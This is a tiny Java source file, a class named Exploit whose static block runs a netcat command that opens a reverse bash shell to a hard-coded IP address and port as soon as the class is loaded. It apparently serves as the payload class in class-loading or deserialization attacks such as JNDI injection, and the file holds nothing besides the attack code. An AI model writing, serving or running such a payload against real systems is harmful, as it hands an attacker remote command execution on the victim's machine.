

	public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.6.20.239 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}



